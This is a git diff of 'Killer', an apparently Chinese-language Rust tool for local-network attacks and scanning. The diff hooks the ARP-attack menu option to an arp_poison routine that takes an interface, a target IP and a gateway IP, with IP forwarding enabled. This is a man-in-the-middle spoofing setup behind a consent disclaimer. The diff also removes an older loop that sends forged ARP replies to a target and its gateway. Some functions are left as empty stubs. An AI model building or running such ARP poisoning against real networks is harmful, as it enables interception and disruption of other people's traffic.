@@ -1,16 +1,29 @@
 use clap::{Parser};
 use std::{fs, io::Write, path::Path, thread};
 use std::io::BufRead;
-use std::net::Ipv4Addr;
-use libkiller;
 use rand::Rng;
 use colored::*;
 use std::process;
 use std::str::FromStr;
 use std::time::Duration;
-use libkiller::send_arp_reply;
-use pnet::datalink::MacAddr;
 use serde::{Deserialize, Serialize};
+use std::env::consts::OS;
+
+
+extern crate killer_core;
+
+use killer_core::ArgOptions;
+use killer_core::arp_poison;
+
+
+use pnet::datalink::MacAddr;
+use std::net::Ipv4Addr;
+use std::process::Command;
+use pnet::packet::arp::{self, ArpPacket, MutableArpPacket};
+use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
+use pnet::packet::Packet;
+use pnet::util::{checksum};
+
 
 
 
@@ -43,34 +56,6 @@ struct Args {
     help: bool,
 }
 
-fn first_run() {
-    let workspace_path = "KillerWorkSpace";
-    let killer_standard_path = Path::new(workspace_path).join("killer.standard");
-    let config_conf_path = Path::new(workspace_path).join("config.conf");
-
-    match fs::create_dir_all(workspace_path) {
-        Ok(_) => println!("创建工作空间文件夹成功: {}", workspace_path),
-        Err(e) => error_print("0x0x", &format!("创建工作空间文件夹失败: {}", e), "请检查磁盘空间或文件权限"),
-    }
-
-    match fs::write(killer_standard_path.clone(), "initialized") { // 注意这里使用了 `.clone()`
-        Ok(_) => println!("创建初始化标记文件成功: {:?}", killer_standard_path),
-        Err(e) => error_print("0x0x", &format!("创建初始化标记文件失败: {}", e), "请检查磁盘空间或文件权限"),
-    }
-
-    match fs::write(config_conf_path.clone(), "configured") {
-        Ok(_) => println!("创建配置文件成功: {:?}", config_conf_path),
-        Err(e) => error_print("0x0x", &format!("创建配置文件失败: {}", e), "请检查磁盘空间或文件权限"),
-    }
-}
-
-fn check_initialization() -> bool {
-    let workspace_path = Path::new("KillerWorkSpace");
-    let killer_standard_path = workspace_path.join("killer.standard");
-    let config_conf_path = workspace_path.join("config.conf");
-
-    fs::metadata(killer_standard_path).is_ok() && fs::metadata(config_conf_path).is_ok()
-}
 
 fn tiptext() -> String {
     let mut rng = rand::thread_rng();
@@ -94,13 +79,31 @@ fn tiptext() -> String {
     tiptext.to_string()
 }
 
-fn error_print(error_code: &str, error_message: &str, try_todo: &str) {
-    println!();
-    println!("          致命错误：{}", error_code);
-    println!("  :(      错误信息：{}", error_message);
-    println!("          尝试解决：{}", try_todo);
-    println!();
-    std::process::exit(error_code.parse().unwrap());
+fn error_print(error_level: u64,error_code: &str, error_message: &str, try_todo: &str) {
+    if error_level == 0 {
+        println!("{}", "致命错误!错误级别:0；正在退出...".red());
+        println!("          错误代码：{}", error_code);
+        println!("  :(      错误信息：{}", error_message);
+        println!("          尝试解决：{}", try_todo);
+        println!("{}", "===========================".red());
+        std::process::exit(error_code.parse().unwrap());
+    } else if error_level == 1 {
+        println!("{}", "错误!错误级别:1；正在退出...".red());
+        println!("          错误代码：{}", error_code);
+        println!("  :(      错误信息：{}", error_message);
+        println!("          尝试解决：{}", try_todo);
+        println!("{}", "===========================".red());
+        std::process::exit(error_code.parse().unwrap());
+    } else if error_level == 2 {
+        println!("{}", "警告!错误级别:2；请检查...".yellow());
+        println!("          错误代码：{}", error_code);
+        println!("  :(      错误信息：{}", error_message);
+        println!("          尝试解决：{}", try_todo);
+        println!("{}", "===========================".red());
+    }
+
+
+
 }
 
 /// 从用户获取输入，并返回输入的内容。
@@ -118,12 +121,14 @@ fn input(prompt: &str) -> String {
 }
 
 
+
 fn main() {
     let args = Args::parse();
 
-    if !check_initialization() {
-        first_run();
-    }
+    // if !check_initialization() {
+    //     first_run();
+    // }
+    //Nerver check,These code will be cleaned at Release build.
 
     print!("Done!\n\n");
     print!(r#"
@@ -134,7 +139,6 @@ fn main() {
     |_|\_\ |_| |_| |_|  \___| |_|
 
     "#);   // header text
-
     println!("{}", tiptext());
 
     println!("{}", r#"
@@ -144,6 +148,7 @@ fn main() {
     [S] [Scan]          扫描所有内网的活跃IP
     [N] [Net]           获取本机IP、网关和MAC地址
     [P] [Port]          扫描指定局域网IP的开放端口
+    [L] [Language]      切换程序的当前语言
     [A] [About]         关于这个程序&帮助页面
     [C] [CommandList]   全部命令列表
 
@@ -152,8 +157,8 @@ fn main() {
 
     // 处理命令行参数
     if args.kill {
-        println!("Killer Pre-view（ARP Attack）");
-        println!("警告：Pre-view版本暂时不开放功能，仅作为基础框架来编译");
+
+
     } else if args.scan {
         println!("Killer Pre-view (IP Scan)");
         println!("警告：Pre-view版本暂时不开放功能，仅作为基础框架来编译");
@@ -191,14 +196,34 @@ fn main() {
 
             match choice.as_str() {
                 "K" => {
-                    println!("Killer Pre-view（ARP Attack）");
-                    // let this_ip = input("请输入你的IP地址，也可以输入其他非网关的IP地址：");
-                    // let ip = input("请输入目标IP地址：");
-                    // let mac = input("请输入目标MAC地址：");
-                    // let gateway = input("请输入网关IP地址：");
-                    //
-                    //
-                    // kill(ip.parse().unwrap(), this_ip.parse().unwrap(), mac.parse().unwrap(), gateway.parse().unwrap(), Default::default());
+                    println!("在使用前确保此程序已授予超级管理员权限(root或administrator)!");
+                    println!("配置攻击参数以发送Arp包：");
+                    let user_interface = input("输入网络接口名");
+                    let user_target_ip = input("输入目标IP：");
+                    let user_fake_ip = input("输入网关的IP：");
+
+                    println!("{}", "最后警告：此程序的开发者不承担用户（你）使用此程序所带来的后果，如果不同意这项规定请不要使用此程序，是否了解？".red());
+                    println!(r#"
+    [Y] 是的，继续使用，并且我同意遵守此程序使用协议。
+    [N] 不同意，退出程序，并且停止使用此程序。
+    "#);
+
+                    if ["y", "yes", "Y", "YES"].contains(&input(">>> ").to_lowercase().as_str()) {
+                        let options = ArgOptions {
+                            interface: user_interface.to_string(),
+                            target_ip: Ipv4Addr::from_str(&*user_target_ip).unwrap(),
+                            gateway_ip: Ipv4Addr::from_str(&*user_fake_ip).unwrap(),
+                            ip_forward: true,
+                            log_traffic: false,
+                        };
+                        arp_poison(options);
+                    } else {
+                        println!("正在退出...");
+                        std::process::exit(0);
+                    }
+
+
+
                 }
                 "S" => {
                     println!("Killer Pre-view (IP Scan)");
@@ -226,6 +251,14 @@ fn main() {
             }
         }
     }
+}
+
+fn windows_decision() -> bool{
+    if !cfg!(windows) {
+        return true
+    }
+    false
+
 }
 
 fn about() {
@@ -275,27 +308,17 @@ fn command_list() {
     "#);
 }
 
-fn kill(target_ip: Ipv4Addr, attacker_ip: Ipv4Addr, attacker_mac: MacAddr, gateway_ip: Ipv4Addr, gateway_mac: MacAddr) {
-    println!("Starting ARP attack on target IP: {}", target_ip);
+fn kill(attacker_ip: Ipv4Addr, attacker_mac: MacAddr, target_ip: Ipv4Addr, target_mac: MacAddr, interface_name: String, interval: u64) {
+    if !windows_decision() {
 
-    // 持续发送 ARP 回复
-    loop {
-        // 向目标发送 ARP 回复，声称攻击者的 IP 地址对应于网关的 MAC 地址
-        if let Err(e) = send_arp_reply("", target_ip, <[u8; 6]>::from(gateway_mac), attacker_ip, <[u8; 6]>::from(attacker_mac)) {
-            println!("Failed to send ARP reply to target: {}", e);
-            break;
-        }
 
-        // 向网关发送 ARP 回复，声称攻击者的 IP 地址对应于目标的 MAC 地址
-        if let Err(e) = send_arp_reply("", gateway_ip, <[u8; 6]>::from(attacker_mac), attacker_ip, <[u8; 6]>::from(attacker_mac)) {
-            println!("Failed to send ARP reply to gateway: {}", e);
-            break;
-        }
 
-        thread::sleep(Duration::from_millis(10));
+    }
+    else {
+        //Send ARP packets on Windows
     }
 }
-    fn help() {
+fn help() {
         println!(r#"
     Killer v5.0   (杀手 v5.0)
     这是 Killer 的 Rust 版本，旨在成为一个高性能和跨平台的程序。
